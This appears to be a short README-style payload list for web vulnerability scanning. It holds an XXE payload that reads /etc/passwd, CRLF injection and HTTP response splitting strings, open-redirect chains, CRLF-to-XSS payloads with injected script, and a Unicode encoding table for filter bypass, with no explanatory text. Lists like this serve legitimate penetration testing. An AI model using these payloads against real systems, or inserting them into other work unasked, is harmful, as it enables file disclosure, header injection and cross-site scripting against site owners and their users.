# Payloads
Payloads for scanning Vulnarability


# XXE Vulnarability Payloads

```xml 
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ 
 <!ELEMENT foo ANY>
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>```



# CRLF Injecton Payloads

%0d%0aSet-Cookie:%20lang=crlf%3b

/%25E5%2598%258A%25E5%2598%258Dcontent-type:text/html%25E5%2598%258A%25E5%2598%258Dlocation:%25E5%2598%258A%25E5%2598%258D%25E5%2598%258A%25E5%2598%258D%25E5%2598%25BCsvg/onload=alert%2528innerHTML%2529%25E5%2598%25BE

# HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue
2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2                    
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2                       
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

# CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

# Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
